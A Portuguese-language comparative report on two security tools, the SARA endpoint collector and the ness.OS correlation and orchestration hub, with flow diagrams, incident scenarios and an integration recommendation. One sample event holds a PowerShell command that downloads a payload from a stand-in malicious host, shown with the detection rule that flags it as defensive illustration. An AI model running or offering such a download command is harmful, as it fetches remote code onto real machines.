# Relatório Comparativo: SARA vs ness.OS
## Como Cada Ferramenta Trabalha e Por Que Abordagens Diferem

**Documento:** Análise de metodologia operacional  
**Data:** 17/09/2026  
**Contexto:** Avaliação de complementaridade técnica vs competição direta  
**Público:** Liderança técnica, arquitetos, tomadores de decisão

---

## 📋 Síntese Executiva

| Aspecto | SARA (GEMINA) | ness.OS |
|---|---|---|
| **Objetivo** | **VER tudo** (coleta) | **ENTENDER tudo** (decisão) |
| **Abordagem** | Observação passiva de eventos | Correlação ativa entre sinais |
| **Escopo** | Windows endpoints + postura AD | Multi-cloud + multi-ferramenta |
| **Arquitetura** | Unidirecional (agente → cloud) | Hub bidirecional (múltiplas entradas → ações) |
| **Tempo de resposta** | Alertas (segundos) | Incidentes (minutos) |
| **Decisão** | Regras pré-programadas | Contexto + correlação + ML |
| **Saída** | Portal web de eventos | Automações orquestradas (n8n) |

**Conclusão-síntese:** 
- Se a pergunta é **"O que aconteceu?"** → SARA responde
- Se a pergunta é **"Por que aconteceu? O que fazer?"** → ness.OS responde

---

## 🎯 A Questão Central: "Como você sabe o que é um problema?"

### Abordagem SARA: Pattern Matching em Tempo Real

```
SARA pergunta: "Este evento está no meu dicionário de RUIM?"

Evento chega: "Usuário criado em AD"
        ↓
Procura em regras: "CREATE_USER = Bad? Depends on OU..."
        ↓
Se OU == "SUSPICIOUS_OU" → Alerta
Se OU == "NORMAL_OU" → Ignora
        ↓
Resultado: Alerta binário (SIM/NÃO)
```

**Como SARA faz:**
1. **Coleta:** Hooks no sistema operacional (ETW, WMI, USB, LDAP)
2. **Normalização:** Transforma evento Windows nativo em JSON estruturado
3. **Match:** Compara contra banco de regras (assinaturas, padrões conhecidos)
4. **Decisão:** IF evento MATCHES regra → Alerta | Ignorar
5. **Entrega:** HTTP POST para CDOC cloud (portal SARA)
6. **Visualização:** Dashboard mostra eventos + alertas

**Exemplo real SARA:**

```json
{
  "event_type": "process_creation",
  "timestamp": "2026-09-17T14:23:45Z",
  "process_name": "powershell.exe",
  "parent_process": "svchost.exe",
  "command_line": "powershell.exe -c Invoke-WebRequest http://malware.com/payload",
  "user": "DOMAIN\\Administrator",
  "host": "WORKSTATION-001"
}

Regra SARA:
  IF process_name == "powershell.exe" 
  AND command_line CONTAINS "Invoke-WebRequest"
  THEN severity = HIGH
  ALERT

Resultado: ⚠️ "Suspicious PowerShell Activity Detected"
```

---

### Abordagem ness.OS: Correlação Contextual + Orquestração

```
ness.OS pergunta: "Este eventos faz SENTIDO no contexto?"

Múltiplos eventos chegam simultaneamente:
  • Zabbix: CPU subiu 95%
  • Wazuh: 50 tentativas de login falhadas
  • GLPI: Usuário reportou "servidor lento"
  • Authentik: Token anômalo gerado
        ↓
Normaliza tudo em fingerprinting comum
        ↓
Correlaciona: "5 sinais = 1 incidente"
        ↓
Busca contexto: "Quem é o usuário? Qual datacenter? Histórico?"
        ↓
Invoca LLM (Gemini): "Esta combinação indica..."
        ↓
Executa ação: n8n workflow (notifica, escalona, isola, coleta logs)
        ↓
Feedback: "Ação executada? Funcionou?"
        ↓
Resultado: Incidente com RCA (Root Cause Analysis) + ações aplicadas
```

**Como ness.OS faz:**
1. **Múltiplas fontes:** Zabbix, Wazuh, GLPI, Authentik, aplicações via webhook
2. **Normalização:** Mapeia para schema `Event` universal (timestamp, host, user, severity, context)
3. **Deduplicação:** TimescaleDB + pgvector para fingerprinting (evita N alertas do mesmo problema)
4. **Correlação:** Busca outros eventos relacionados (mesmo host? mesmo usuário? mesma janela temporal?)
5. **Contexto:** Consulta GLPI (quem é? qual projeto? histórico?), AD (privilégios), histórico de incidentes
6. **Decisão inteligente:** FastAPI + Gemini LLM analisa contexto completo
7. **Ação:** n8n orquestra workflow (Slack, PagerDuty, ticket GLPI, coleta forensics)
8. **Feedback:** Monitora resultado da ação, aprende para próximas ocorrências

**Exemplo real ness.OS:**

```json
Evento 1 (Zabbix):
{
  "host": "db-prod-01",
  "metric": "cpu",
  "value": 95,
  "threshold": 80,
  "timestamp": "2026-09-17T14:20:00Z"
}

Evento 2 (Wazuh):
{
  "host": "db-prod-01",
  "rule_id": 5151,
  "description": "Multiple Failed User Logins",
  "failed_attempts": 47,
  "user": "db_service_account",
  "timestamp": "2026-09-17T14:21:00Z"
}

Evento 3 (GLPI):
{
  "ticket_id": "INC-4521",
  "title": "Database server slow",
  "assigned_to": "TeamOps",
  "created": "2026-09-17T14:22:00Z"
}

Hub ness.OS:
  1. Fingerprint: hash([db-prod-01, CPU, security, 14:20-14:22])
  2. Dedup: "Combinação única, não vista antes"
  3. Contexto: "db-prod-01 = Produção crítica, PCI-DSS"
  4. Correlação: "3 sinais em 2 minutos = coordenado? Ou coincidência?"
  5. LLM: "Padrão de brute force + resource exhaustion = Ataque DDoS de aplicação"
  6. Ação n8n:
     - Isolate: "Bloqueia SSH exceto admin-vpn"
     - Collect: "Dump PostgreSQL slow query log"
     - Alert: Slack @oncall "INC-4521 escalado: Ataque identificado"
     - Ticket: GLPI "Root cause: SQL injection no app v2.3.1"
  7. Feedback: "Isolamento bem-sucedido? Sim. Recuperação ETA? 15min."

Resultado: Incidente correlacionado + causa raiz + ação automática
```

---

## 🔄 Fluxo Técnico Detalhado

### SARA: Fluxo Linear de Observação

```
┌──────────────────────────────────────────────────────────────┐
│                    SARA Agent Loop                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Every 1-6 hours:                                            │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ 1. Hook ETW Channels                                   │ │
│  │    • Security (login, privilege escalation)            │ │
│  │    • System (service start, driver load)               │ │
│  │    • Application (errors, warnings)                    │ │
│  │                                                        │ │
│  │ 2. Query WMI (Windows Management Instrumentation)      │ │
│  │    • Installed software + versions                     │ │
│  │    • Running processes                                 │ │
│  │    • Network connections                               │ │
│  │    • Scheduled tasks                                   │ │
│  │    • Firewall rules                                    │ │
│  │    • AntiVirus status                                  │ │
│  │                                                        │ │
│  │ 3. Query LDAP (Active Directory)                       │ │
│  │    • User properties (disabled? MFA enabled?)           │ │
│  │    • Group membership (privileged? remote users?)       │ │
│  │    • Password policy compliance (age, complexity)       │ │
│  │    • Kerberos tickets (anomalous delegation?)           │ │
│  │                                                        │ │
│  │ 4. Enumerate Devices                                   │ │
│  │    • USB devices connected                             │ │
│  │    • Blocked/unauthorized devices                      │ │
│  │                                                        │ │
│  │ 5. Get Heartbeat                                       │ │
│  │    • Hostname                                          │ │
│  │    • IP address                                        │ │
│  │    • OS version (10 1809+/2016+)                        │ │
│  │    • Last restart                                      │ │
│  └────────────────────────────────────────────────────────┘ │
│                     │                                        │
│                     ▼                                        │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ 6. Serialize to JSON                                   │ │
│  │    {                                                    │ │
│  │      "agent_id": "XXXXX",                               │ │
│  │      "timestamp": "2026-09-17T14:25:00Z",               │ │
│  │      "events": [                                        │ │
│  │        {"type": "login", "user": "admin", ...},         │ │
│  │        {"type": "process_create", "pid": 1234, ...}    │ │
│  │      ],                                                │ │
│  │      "inventory": {...},                               │ │
│  │      "heartbeat": {...}                                │ │
│  │    }                                                    │ │
│  └────────────────────────────────────────────────────────┘ │
│                     │                                        │
│                     ▼                                        │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ 7. Compress + Encrypt                                  │ │
│  │    gzip + AES-256                                       │ │
│  └────────────────────────────────────────────────────────┘ │
│                     │                                        │
│                     ▼                                        │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ 8. Connect SARA Backend                                │ │
│  │    • Resolve DNS: sara.sigmaone.io                     │ │
│  │    • TLS 1.3 + mTLS cert pinning                       │ │
│  │    • Authenticate with device cert + token            │ │
│  │    • POST /api/events (payload gzipped)                │ │
│  │    • Receive ACK + new config (if changed)             │ │
│  └────────────────────────────────────────────────────────┘ │
│                     │                                        │
│                     ▼                                        │
└──────────────────────────────────────────────────────────────┘
                     │
                     ▼
        ┌───────────────────────────────┐
        │  SARA Backend (CDOC)          │
        ├───────────────────────────────┤
        │ 9. Receive + Verify           │
        │    • Check mTLS cert          │
        │    • Validate enrollment      │
        │    • Decompress               │
        │                               │
        │ 10. Parse Events              │
        │     Deserialize JSON payload  │
        │                               │
        │ 11. Run Detection Rules       │
        │     IF event matches rule     │
        │     THEN create alert         │
        │     Severity: Critical/High/  │
        │              Medium/Info      │
        │                               │
        │ 12. Store + Index             │
        │     PostgreSQL + Elasticsearch│
        │                               │
        │ 13. Display in Portal         │
        │     Events tab                │
        │     Alerts tab                │
        │     Posture score (%)         │
        │                               │
        └───────────────────────────────┘
```

**Lógica de alerta (pseudocódigo):**
```python
def process_sara_event(event, rules):
    for rule in rules:
        if matches(event, rule):
            alert = create_alert(
                severity=rule.severity,
                message=rule.message,
                event=event,
                timestamp=now()
            )
            save_alert(alert)
            if rule.severity == "CRITICAL":
                notify_slack(alert)
    
    # Se nenhuma regra bateu: evento silencioso
    # (Dados armazenados, mas sem alerta visual)
```

---

### ness.OS: Fluxo de Correlação com Feedback

```
┌────────────────────────────────────────────────────────────────┐
│                 Multiple Data Sources                          │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐         │
│  │   Zabbix     │  │    Wazuh     │  │    GLPI      │         │
│  │   NOC        │  │   HIDS/NIDS  │  │   ITSM       │         │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘         │
│         │                 │                 │                 │
│  Webhooks / API / DB Query                 │                 │
│         │                 │                 │                 │
├─────────┴─────────────────┴─────────────────┴────────────────┤
│                   WebSocket Hub (FastAPI)                     │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 1. Event Ingestion (Normalization)                    │  │
│  │                                                        │  │
│  │ Raw Zabbix:  {"host":"db01","metric":"cpu","val":95}  │  │
│  │ Raw Wazuh:   {"rule_id":5151,"count":47,"user":"db"}  │  │
│  │ Raw GLPI:    {"ticket":"INC4521","title":"slow"}      │  │
│  │                   ↓                                    │  │
│  │ Normalized:  {                                        │  │
│  │   "id": "evt_12345",                                  │  │
│  │   "source": "zabbix|wazuh|glpi",                      │  │
│  │   "timestamp": "2026-09-17T14:20:00Z",                │  │
│  │   "host": "db-prod-01",                               │  │
│  │   "user": "db_service_account",                       │  │
│  │   "event_type": "cpu_spike|brute_force|incident",     │  │
│  │   "severity": 8,                                      │  │
│  │   "raw": {...original...}                             │  │
│  │ }                                                      │  │
│  └────────────────────────────────────────────────────────┘  │
│                     │                                         │
│                     ▼                                         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 2. Deduplication (pgvector Fingerprint)               │  │
│  │                                                        │  │
│  │ Hash = SHA256(host + event_type + window_time)        │  │
│  │ Query TimescaleDB:                                   │  │
│  │   "SELECT * FROM events WHERE fingerprint = hash"    │  │
│  │                                                        │  │
│  │ If exists:  ADD to existing incident                  │  │
│  │ If new:     CREATE new incident                       │  │
│  └────────────────────────────────────────────────────────┘  │
│                     │                                         │
│                     ▼                                         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 3. Context Enrichment (PostgreSQL)                    │  │
│  │                                                        │  │
│  │ Query GLPI:    "db-prod-01 = Tier/Criticality?"      │  │
│  │ Query Authentik: "db_service_account = Privileged?"   │  │
│  │ Query Zabbix:  "Histórico de alertas deste host?"    │  │
│  │ Query CMDB:    "Dependências? Backups?"               │  │
│  │ Query KBase:   "Problema conhecido?"                  │  │
│  │                                                        │  │
│  │ Resultado:                                            │  │
│  │ {                                                      │  │
│  │   ...incident...,                                     │  │
│  │   "context": {                                        │  │
│  │     "criticality": "CRITICAL",                        │  │
│  │     "slo": "99.99%",                                  │  │
│  │     "owner_team": "DBAs",                             │  │
│  │     "backup_rpo": "1h",                               │  │
│  │     "similar_incidents": 3,                           │  │
│  │     "last_maintenance": "2026-09-10"                  │  │
│  │   }                                                    │  │
│  │ }                                                      │  │
│  └────────────────────────────────────────────────────────┘  │
│                     │                                         │
│                     ▼                                         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 4. Correlation Analysis (Temporal + Spatial)          │  │
│  │                                                        │  │
│  │ Query: "SELECT * FROM incidents WHERE                 │  │
│  │         host IN (db-prod-01 AND dependents)          │  │
│  │         AND timestamp >= now() - 5min"               │  │
│  │                                                        │  │
│  │ Result: 5 related events in 2 minutes                 │  │
│  │         → NOT coincidence, likely ONE root cause      │  │
│  │                                                        │  │
│  │ Hypothesis: "SQL Injection attack or runaway query"   │  │
│  └────────────────────────────────────────────────────────┘  │
│                     │                                         │
│                     ▼                                         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 5. LLM Analysis (Gemini)                              │  │
│  │                                                        │  │
│  │ Prompt: """                                           │  │
│  │ Events correlacionados:                               │  │
│  │ - CPU subitamente 95% em db-prod-01                  │  │
│  │ - 47 failed logins com db_service_account em 1 min   │  │
│  │ - Usuário reporta servidor lento                      │  │
│  │ - Sistema criticality: CRITICAL (PCI)                 │  │
│  │ - Histórico: similar incident em 2026-08-20          │  │
│  │                                                        │  │
│  │ Análise:                                              │  │
│  │ 1. Qual é a causa raiz mais provável?                 │  │
│  │ 2. Qual equipe deve responder?                        │  │
│  │ 3. Qual é o próximo passo recomendado?               │  │
│  │ """                                                    │  │
│  │                                                        │  │
│  │ Gemini responde:                                      │  │
│  │ "RCA: Aplicação v2.3.1 tem SQL injection em endpoint  │  │
│  │  /api/reports. Ataque gera queries massivas.          │  │
│  │                                                        │  │
│  │ Equipe: AppOps (deployment) + DBAs (mitigation)       │  │
│  │                                                        │  │
│  │ Ações recomendadas:                                   │  │
│  │ 1. Isolate: Bloqueia /api/reports em WAF               │  │
│  │ 2. Mitigate: Mata queries lentas em 30s               │  │
│  │ 3. Collect: Dump slow query log para forensics         │  │
│  │ 4. Notify: Escalona para AppSec                       │  │
│  │ 5. Ticket: Cria GLPI para patch v2.3.2                │  │
│  │ """                                                    │  │
│  └────────────────────────────────────────────────────────┘  │
│                     │                                         │
│                     ▼                                         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 6. Action Orchestration (n8n workflows)               │  │
│  │                                                        │  │
│  │ n8n_isolation_workflow:                               │  │
│  │   1. Update WAF (ModSecurity): block /api/reports     │  │
│  │   2. Notify Slack #incident: "Isolation active"       │  │
│  │   3. Trigger database: ALTER SESSION KILL long-run    │  │
│  │   4. Log event: Auditlog "Automated isolation 14:25"  │  │
│  │                                                        │  │
│  │ n8n_collection_workflow:                              │  │
│  │   1. SSH to db-prod-01 (Psono secret)                 │  │
│  │   2. Execute: SELECT * FROM pg_stat_statements        │  │
│  │   3. Dump slow query log: tail -100000 postgresql.log │  │
│  │   4. Upload to GCS bucket (forensics/incident)        │  │
│  │   5. Generate hash: SHA256 forensics.tar.gz           │  │
│  │                                                        │  │
│  │ n8n_ticket_workflow:                                  │  │
│  │   1. GLPI POST: Create incident INC-4521-SEC          │  │
│  │   2. Associate: Links to original ticket INC-4521      │  │
│  │   3. Assign: To AppSec team (from Authentik)          │  │
│  │   4. Set priority: CRITICAL (inferred)                │  │
│  │   5. Add knowledge base: "SQL Injection mitigation"   │  │
│  │                                                        │  │
│  └────────────────────────────────────────────────────────┘  │
│                     │                                         │
│                     ▼                                         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ 7. Feedback Loop (Monitor + Learn)                    │  │
│  │                                                        │  │
│  │ Poll every 30 seconds:                                │  │
│  │   • Is WAF block still active?                        │  │
│  │   • Did queries stop?                                 │  │
│  │   • Is CPU back to normal?                            │  │
│  │   • Has team ack'd incident?                          │  │
│  │                                                        │  │
│  │ Update incident status:                               │  │
│  │   "Mitigated at 14:28 (3min from detection)"          │  │
│  │   "Root cause verified: v2.3.1 SQL injection"         │  │
│  │   "Action effectiveness: 10/10 (perfect response)"    │  │
│  │                                                        │  │
│  │ Learn:                                                │  │
│  │   • Add fingerprint to KBase                          │  │
│  │   • Update Zabbix triggers (if needed)                │  │
│  │   • Flag v2.3.1 builds for blocklist                  │  │
│  │                                                        │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## 📊 Comparação por Cenário

### Cenário 1: Novo Malware Unknown

#### SARA Aborda:
```
Agente detecta arquivo novo em C:\Windows\Temp\exploit.exe

Regras SARA:
  • Hash: ❌ Não reconhecido
  • Assinatura: ❌ Não correspondido
  • Heurística: ? "Potencialmente suspeito"
  • Comportamento: ⚠️ "Criado por svchost, executado por explorer"

Resultado: ALERTA informacional
  "Arquivo não reconhecido em locação suspeita"
  
  ✅ Você sabe: "Algo novo aconteceu"
  ❌ Você não sabe: "É perigoso? Aprovar ou bloquear?"
```

#### ness.OS Aborda:
```
Múltiplas fontes detectam simultaneamente:
  • Antivírus parcial (Wazuh): "arquivo novo"
  • EDR disparador (Wazuh): "comportamento anômalo"
  • Zabbix: "processo parent inusitado"
  • GLPI: "Deploy recente? Mudança aprovada?"

Correlação:
  • Timestamp: Todos em 2 segundos ✓
  • Host: Production database (Criticality: CRITICAL) ✓
  • User: Domain service account (privilege: HIGH) ✓
  • Context: Não há mudança aprovada em GLPI ❌
  
Análise LLM:
  "3 sinais + contexto criticidade ALTA + sem mudança = 95% certeza infection
   Ação automática: Isola host, coleta forensics, notifica CISO"

Resultado: INCIDENTE com ação automática
  "Possível malware em sistema crítico — isolado + forensics coletados"
  
  ✅ Você sabe: "É perigoso, por quê e o que fazer"
  ✅ Você já agiu: "Sistema isolado, dados seguros, investigação começou"
```

**Vencedor por cenário:** ness.OS (contexto + ação automática > alerta passivo)

---

### Cenário 2: Auditoria Compliance (PCI-DSS)

#### SARA Aborda:
```
Varredura periódica coleta:
  ✅ Software instalado
  ✅ Patches aplicados / faltando
  ✅ Usuários ativos em AD
  ✅ Senhas confirmando políticas
  ✅ USB devices (bloqueados?)
  ✅ Firewall rules

Relatório:
  "Postura: 87/100 (12 findings)"
  • Finding 1: Windows 10 2004 (requer 1809+) → ✅ Compliant
  • Finding 2: Adobe Reader 2024.001 (CVE-2024-XXXX faltando patch)
  • Finding 3: Usuário administrativo sem MFA
  • ...

✅ Você tem: Snapshot completo da postura

❌ Lacuna: Sem contexto de negócio
  (É crítico? Qual o impacto? Quem vai remediar?)
```

#### ness.OS Aborda:
```
Consome relatório SARA + enriquece com contexto:

Evento do SARA: "Adobe Reader CVE-2024-XXXX unpatched"
        ↓
Lookup GLPI:
  • Host: "workstation-04 (Desenvolvedor)"
  • Tier: "Development (LOW criticality)"
  • Owner: "TechTeam"
  • Last patch: "2 dias atrás"
  
Lookup Knowledge Base:
  • CVE-2024-XXXX: "Requer acesso local + malicious PDF"
  • Mitigação: "PDFs bloqueados via email gateway"
  
Correlação:
  • Criticidade real: LOW (é dev, não production)
  • Risco efetivo: VERY LOW (email gateway bloqueia)
  • Ação: "Ageda patch para próxima manutenção (window 2026-09-24)"

Resultado: NÃO é alerta, é agendamento contextualizado

❌ Se fosse em production:
  • Criticidade real: CRITICAL
  • Risco efetivo: HIGH
  • Ação: "Patch emergencial hoje (14:00)"

✅ Você tem: Priorização intelligent, remediação contextualizada
```

**Vencedor por cenário:** ness.OS (contextualização inteligente > auditoria cega)

---

### Cenário 3: Resposta Rápida a Incidente

#### SARA Aborda:
```
Usuario reporta: "Não consigo fazer login"

SARA detecta:
  ✅ Login failure: "user@domain.com"
  ✅ Tentativas: 47
  ✅ Período: 5 minutos
  ✅ Origem: 3 IPs diferentes
  
Alerta gerado:
  "🚨 Brute Force Attack Detected"
  Severity: HIGH
  
Ação manual:
  • Operador recebe alerta
  • Operador acessa portal SARA
  • Operador clica "View Events"
  • Operador estuda 47 telas de logs
  • Operador contatata AD team (via mail/chat)
  • AD team analisa histórico
  • AD team bloqueia conta ou reseta
  • ETA: 15 minutos

Resultado: Alerta + investigação manual
```

#### ness.OS Aborda:
```
Mesmo evento correlacionado com contexto:

Incidente correlacionado:
  • Wazuh: 47 failed logins
  • Zabbix: Nenhuma ação suspeita após failures
  • GLPI: Usuário é "Junior Dev" (LOW privileged)
  • Authentik: Token deste usuário válido desde 14:00
  • Context: "Usuário em OnBoarding, password reset normal?"
  
LLM Analysis:
  "Padrão típico: novo usuário esqueceu senha
   Prioridade: LOW (não afeta negócio crítico)
   Ação: Self-service password reset via Authentik"
  
Automação via n8n:
  • Envia email automático: "Esqueceu senha?"
  • Link resets com one-time-token
  • 30 segundos: Usuário consegue fazer reset
  • Zabbix valida: "user@domain.com agora online"
  
Resultado: Incidente auto-resolvido em 30 segundos
  "Usuário conseguiu fazer login via self-service"

Ação manual: ZERO
ETA: 30 segundos (vs 15 minutos SARA)
```

**Vencedor por cenário:** ness.OS (automação + contexto > alerta + manual)

---

### Cenário 4: Relatório de Conformidade para Auditor Externo

#### SARA Aborda:
```
Auditor pede: "Mostre-me que não há malware nos endpoints"

SARA gera:
  ✅ Relatório: "47 endpoints scanned, 0 detections"
  ✅ Timestamps: "Last scan 2026-09-17 14:00 UTC"
  ✅ Software: "Listas de todas as aplicações instaladas"
  ✅ Patches: "Configuração de Windows Update"
  ✅ Postura: "Score 87/100"
  
  Porém:
  ❌ Contextualização: "É suficiente? Quais hosts estão ativos?"
  ❌ Histórico: "Estava assim há 6 meses? Qual a taxa de compliance?"
  ❌ Correlação: "Se houver 1 host sem antivírus, qual o impacto?"
```

#### ness.OS Aborda:
```
Mesmo relatório + análise de tendência:

Relatório estendido:
  ✅ Snapshot: "47 endpoints, 0 detections (SARA)"
  ✅ Histórico: "Compliance 87% ± 3% nos últimos 6 meses"
  ✅ Trend: "Score subiu 12% em 8 semanas (polimento)"
  ✅ Críticos: "Identificados 3 hosts CRITICAL sem últimas patches"
  ✅ Ação: "Agendado patch forçado para 2026-09-18"
  
  Adicionalmente:
  ✅ Contexto de negócio: "Criticalidade por sistema"
  ✅ Risco residual: "Host crítico sem AV = 2/10 risk"
  ✅ Mitigações: "Host isolado em VLAN zero-trust"
  ✅ Demonstração: "Ao desconectar WAF vemos alertas em 2s"
  
  Para auditor:
  "Não apenas coleta pasiva, temos também orquestração de remediação.
   Cada achado tem plano de ação confirmado + timeline."
```

**Vencedor por cenário:** ness.OS (contexto + remediação demonstrável)

---

## 🎯 Quando Cada Uma Vence

### SARA é a solução melhor quando:

✅ **Você quer visibilidade Windows pura**
  - USB controle
  - AD posture assessment
  - CIS benchmark scanning
  - Compliance snapshot

✅ **Você tem apenas Windows endpoints** (não multi-cloud)

✅ **Você aceita alertas + investigação manual**

✅ **Você quer especialista em segurança de endpoint**

✅ **Você precisa de integração com KnowBe4, Tenable, etc.** (SARA já fala com essas)

---

### ness.OS é a solução melhor quando:

✅ **Você quer orquestração de resposta automática**

✅ **Você tem múltiplas fontes** (Zabbix, Wazuh, GLPI, apps)

✅ **Você quer contexto de negócio** (criticidade, SLA, custo)

✅ **Você quer ML/LLM analisando padrões**

✅ **Você quer feedback loop** (ação → monitoramento → aprendizado)

✅ **Você quer on-premises ou self-hosted**

---

## 🔄 Integração Possível (Ganha-Ganha)

### Arquitetura Complementar

```
                    ┌──────────────────────────┐
                    │   Windows Endpoints      │
                    └───────────┬──────────────┘
                                │
                    ┌───────────▼──────────────┐
                    │   SARA Agent            │
                    │  (VER tudo: EventLog)   │
                    │                         │
                    │  • ETW events           │
                    │  • WMI inventory        │
                    │  • AD posture           │
                    │  • USB control          │
                    └───────────┬──────────────┘
                                │
                                │ SARA Alert (JSON)
                                │
            ┌───────────────────▼──────────────────────┐
            │   ness.OS Hub (ENTENDER tudo)           │
            ├───────────────────────────────────────┐  │
            │ Webhook ingestion: /api/sara-events   │  │
            ├───────────────────────────────────────┤  │
            │ 1. Normalize & deduplicate             │  │
            │ 2. Correlate com Zabbix, Wazuh, etc   │  │
            │ 3. Enrich contexto (GLPI, AD)          │  │
            │ 4. LLM analysis                        │  │
            │ 5. Orquestrate n8n action              │  │
            │ 6. Feedback: Escalona para SARA?       │  │
            └───────────────────────────────────────┘  │
                                                       │
            Saída: Ação corrigida + ticket GLPI        │
            └────────────────────────────────────────┘

Exemplo: SARA vê "USB drive connected"
  ↓
ness.OS correlaciona com "Host = Development"
  ↓
ness.OS contextualiza "É permitido? SIM (dev machine)"
  ↓
ness.OS não escalona, apenas registra
  
vs.

SARA vê "USB drive connected" em Production database
  ↓
ness.OS correlaciona com "Host = db-prod-01 (CRITICAL)"
  ↓
ness.OS contextualiza "Não deve haver USB em PRODUCTION"
  ↓
ness.OS auto-bloqueia via n8n + cria ticket SEC pentest
```

---

## 📈 Tabela Comparativa Executiva

| Quesito | SARA | ness.OS | Integrado |
|---|---|---|---|
| **Coleta de dados** | ⭐⭐⭐ Windows specialist | ⭐⭐ Multi-source | ⭐⭐⭐ SARA (especializado) + outros |
| **Alertas** | ⭐⭐⭐ Rápidos, regras claras | ⭐ Slow, mas completo | ⭐⭐⭐ SARA speed + ness.OS context |
| **Resposta automática** | ❌ Nenhuma | ⭐⭐⭐⭐ Orquestrada | ⭐⭐⭐⭐ Ambas complementares |
| **Contexto negócio** | ❌ Nenhum | ⭐⭐⭐⭐ Completo | ⭐⭐⭐⭐ ness.OS handles |
| **On-premises** | ❌ Cloud-only | ⭐⭐⭐⭐ Self-hosted | ⭐⭐⭐⭐ ness.OS local, SARA remoto |
| **Custo operacional** | ✅ Baixo (cloud) | 🟡 Médio (infra própria) | 🟡 Médio combinado |
| **Tempo setup** | ⭐⭐⭐ Rápido (agent) | ⭐ Lento (múltiplos componentes) | 🟡 Médio |
| **Escalabilidade** | ⭐⭐⭐ Ilimitada (SaaS) | ⭐⭐ Depende de infra | ⭐⭐⭐ SARA escalável, ness.OS steady-state |

---

## 🏁 Conclusão: Qual Escolher?

### Recomendação por Cenário

**Apenas SARA se:**
- [ ] Você só tem Windows endpoints
- [ ] Você aceita alertas + investigação manual
- [ ] Você não tem budget para ness.OS
- [ ] Você quer especialista endpoint sem orquestração

**Apenas ness.OS se:**
- [ ] Você tem múltiplas fontes (Zabbix, Wazuh, GLPI)
- [ ] Você quer automação de resposta
- [ ] Você controla infra própria
- [ ] Você precisa de contexto negócio + ML

**SARA + ness.OS integrado se:** ✅ **RECOMENDADO**
- [ ] Você quer VER tudo (SARA) + ENTENDER tudo (ness.OS)
- [ ] Você consegue suportar webhook entre eles
- [ ] Seu orçamento permite ambos
- [ ] Você quer resposta em minutos, não horas

---

## 📞 Implementação Prática (SARA → ness.OS)

Se decidir integrar, eis o caminho:

```bash
# Step 1: SARA endpoint agora envia alertas para ness.OS
SARA Agent: Configuration ≫ Webhook ≫ https://ness-os.example.com/api/sara-events

# Step 2: ness.OS webhook handler recebe
POST /api/sara-events
{
  "agent_id": "SARA-...",
  "timestamp": "2026-09-17T14:25:00Z",
  "events": [...],
  "context": {...}
}

# Step 3: ness.OS normaliza + correlaciona
FastAPI: sara_events_handler() 
  ↓ Normalizes to Event schema
  ↓ Deduplicates via TimescaleDB fingerprint
  ↓ Correlates com Zabbix/Wazuh/GLPI
  ↓ Engages LLM se correlação alta
  ↓ Launches n8n workflow
  ↓ Feedback: "Action applied" → SARA

# Step 4: Resultado
ness.OS mantém SARA como fonte autorizada de coleta Windows/AD
SARA fica especializado no que faz melhor
Nenhuma duplicação de alerta
```

---

**Documento**: Análise completa de metodologia operacional  
**Próximo passo**: Decision com Ricardo Esper sobre integração  
**Recomendação**: Integração SARA → ness.OS para máxima eficiência
